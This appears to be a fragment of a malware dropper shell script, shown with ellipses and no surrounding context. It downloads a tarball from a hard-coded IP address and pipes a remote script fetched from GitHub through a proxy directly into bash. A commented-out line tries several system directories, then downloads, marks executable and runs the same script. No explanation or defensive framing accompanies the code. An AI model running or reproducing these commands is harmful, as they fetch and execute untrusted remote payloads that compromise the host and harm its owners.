...
rm -rf x1.tar.gz
sleep 1
$bbdira -sL -o x1.tar.gz http://199.19.226.117/b2f628fff19fda999999999/1.0.4.tar.gz
sleep 1
...
$bbdir -fsSL https://jsonp.afeld.me/?url=https://raw.githubusercontent.com/Godover/config/main/rs.sh | bash
$bbdira -fsSL https://jsonp.afeld.me/?url=https://raw.githubusercontent.com/Godover/config/main/rs.sh | bash
#cd /etc||cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; $bbdir -O http://199.19.226.117/b2f628fff19fda999999999/rs.sh||$bbdira -O http://199.19.226.117/b2f628fff19fda999999999/rs.sh;chmod +x rs.sh;./rs.sh
